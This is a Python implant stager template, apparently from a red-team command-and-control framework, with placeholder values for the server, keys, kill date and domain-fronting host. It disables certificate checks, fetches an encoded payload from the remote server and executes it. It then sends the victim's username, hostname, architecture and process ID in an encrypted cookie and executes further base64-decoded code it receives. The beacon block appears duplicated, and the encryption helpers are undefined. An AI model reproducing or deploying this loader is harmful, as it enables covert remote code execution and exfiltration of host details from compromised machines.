import os,sys,base64,ssl,socket,pwd,hashlib,time
try:import urllib.request as urllib2
except:import urllib2
kdn=time.strptime("#REPLACEKILLDATE#","%Y-%m-%d")
pyhash="#REPLACEPYTHONHASH#"
pykey="#REPLACESPYTHONKEY#"
key="#REPLACEKEY#"
serverclean=[#REPLACEHOSTPORT#]
urlid="#REPLACEURLID#"
url=serverclean[0]+"#REPLACEQUICKCOMMAND#"
url2=serverclean[0]+"#REPLACECONNECTURL#"
hh=[#REPLACEDOMAINFRONT#]
ua="#REPLACEUSERAGENT#"
cstr=time.strftime("%Y-%m-%d",time.gmtime());cstr=time.strptime(cstr,"%Y-%m-%d")
# This doesn't exist in python < 2.7.9
if sys.version_info[0] == 3 or (sys.version_info[0] == 2 and sys.version_info[1] >= 7 and sys.version_info[2] >= 9):
    ssl._create_default_https_context=ssl._create_unverified_context
if hh[0]: r=urllib2.Request(url,headers={'Host':hh[0],'User-agent':ua})
else: r=urllib2.Request(url,headers={'User-agent':ua})
res=urllib2.urlopen(r);d=res.read();
try:b=bytes.fromhex(d[1:].decode("utf-8")).decode("utf-8");s=hashlib.sha512(b.encode("utf-8")).hexdigest()
except:c=d[1:];b=c.decode("hex");s=hashlib.sha512(b).hexdigest()
if pykey in b and pyhash == s and cstr < kdn: 
    try:exec(bytes.fromhex(d[1:].decode("utf-8")).decode("utf-8"))
    except:exec(b)
else: sys.exit(0)
un=pwd.getpwuid(os.getuid())[ 0 ];pid=os.getpid()
is64=sys.maxsize > 2**32;arch=('x64' if is64 == True else 'x86')
hn=socket.gethostname();o=urllib2.build_opener()
encsid=encrypt(key, '%s;%s;%s;%s;%s;%s' % (un,hn,hn,arch,pid,urlid))
headers = ({'Host':hh[0],'User-Agent':ua,'Cookie':'SessionID=%s' % encsid.decode("utf-8")})
request = urllib2.Request(url2, headers=headers);response = urllib2.urlopen(request);html = response.read().decode('utf-8');x=decrypt(key, html)
exec(base64.b64decode(x))
un=pwd.getpwuid(os.getuid())[ 0 ];pid=os.getpid()
is64=sys.maxsize > 2**32;arch=('x64' if is64 == True else 'x86')
hn=socket.gethostname();o=urllib2.build_opener()
encsid=encrypt(key, '%s;%s;%s;%s;%s;%s' % (un,hn,hn,arch,pid,urlid))
if hh[0]:r=urllib2.Request(url2,headers={'Host':hh[0],'User-agent':ua,'Cookie':'SessionID=%s' % encsid})
else:r=urllib2.Request(url2,headers={'User-agent':ua,'Cookie':'SessionID=%s' % encsid})
res=urllib2.urlopen(r);html=res.read();x=decrypt(key, html).rstrip('\0');
exec(base64.b64decode(x))
